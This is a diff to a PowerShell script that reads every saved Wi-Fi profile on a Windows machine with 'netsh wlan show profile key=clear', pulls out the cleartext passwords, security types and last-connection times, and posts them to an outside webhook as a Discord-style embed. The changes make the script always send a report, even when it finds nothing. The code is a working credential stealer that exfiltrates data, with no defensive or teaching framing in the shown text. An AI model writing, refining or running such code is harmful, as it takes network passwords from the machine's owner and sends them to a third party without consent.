@@ -10,20 +10,25 @@ foreach ($line in $rawProfiles) {
     }
 }
 $profiles = $profiles | Where-Object { $_ -ne "" } | Sort-Object -Unique
-if ($profiles.Count -eq 0) { Write-Host "No Wi-Fi profiles found."; exit }
 
 $fields = @()
-foreach ($p in $profiles) {
-    $details = netsh wlan show profile name="$p" key=clear
-    $passLine = $details | Select-String "Key Content|Contenuto chiave|Inhaltsschl|Contenido de la clave"
-    $securityLine = $details | Select-String "Authentication|Autenticazione|Authentifizierung|Autenticación"
-    $lastConnLine = $details | Select-String "Last connected|Ultima connessione|Zuletzt verbunden|Última conexión"
+if ($profiles.Count -eq 0) {
+    $fields += @{
+        name = "No Wi-Fi profiles found"
+        value = "Could not detect any saved Wi-Fi networks on this machine."
+        inline = $false
+    }
+} else {
+    foreach ($p in $profiles) {
+        $details = netsh wlan show profile name="$p" key=clear
+        $passLine = $details | Select-String "Key Content|Contenuto chiave|Inhaltsschl|Contenido de la clave"
+        $securityLine = $details | Select-String "Authentication|Autenticazione|Authentifizierung|Autenticación"
+        $lastConnLine = $details | Select-String "Last connected|Ultima connessione|Zuletzt verbunden|Última conexión"
 
-    $password = if ($passLine) { ($passLine -split ':')[1].Trim() } else { '[No password / not found]' }
-    $security = if ($securityLine) { ($securityLine -split ':')[1].Trim() } else { '[Security not found]' }
-    $lastConn = if ($lastConnLine) { ($lastConnLine -split ':')[1].Trim() } else { '[Unknown]' }
+        $password = if ($passLine) { ($passLine -split ':')[1].Trim() } else { '[Could not retrieve password]' }
+        $security = if ($securityLine) { ($securityLine -split ':')[1].Trim() } else { '[Security info not found]' }
+        $lastConn = if ($lastConnLine) { ($lastConnLine -split ':')[1].Trim() } else { '[Last connection unknown]' }
 
-    if ($p.Length -gt 0) {
         $fields += @{
             name = if ($p.Length -gt 256) { $p.Substring(0,256) } else { $p }
             value = "Password: $password`nSecurity: $security`nLast Connected: $lastConn"
@@ -32,8 +37,6 @@ foreach ($p in $profiles) {
     }
 }
 
-if ($fields.Count -eq 0) { Write-Host "No valid Wi-Fi profiles to send."; exit }
-
 $embed = @{
     title = "Detected Wi-Fi Networks"
     color = 3447003
@@ -41,4 +44,4 @@ $embed = @{
 }
 $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 4
 Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json"
-Write-Host "Wi-Fi networks sent successfully."
+Write-Host "Wi-Fi report sent successfully."
